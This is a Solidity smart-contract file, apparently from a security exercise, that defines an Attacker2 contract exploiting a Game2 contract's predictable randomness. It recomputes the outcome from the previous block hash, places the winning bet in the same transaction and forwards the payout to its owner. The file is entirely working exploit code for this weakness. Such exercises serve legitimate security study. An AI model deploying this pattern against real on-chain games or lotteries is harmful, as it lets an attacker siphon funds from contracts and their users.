// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Game2} from "./Game2.sol";

contract Attacker2 {
    Game2 public game;
    address public target;
    address public owner;

    constructor(address _target, address _owner) {
        game = Game2(_target);
        owner = _owner;
    }

    function attack() external payable {
        uint256 value = uint256(blockhash(block.number - 1));
        // Generate a random number, and check the answer
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;
        game.play{value: msg.value}(answer);
    }

    receive() external payable {
        (bool sent,) = owner.call{value: msg.value}("");
        require(sent, "Failed to send ETH");
    }
}
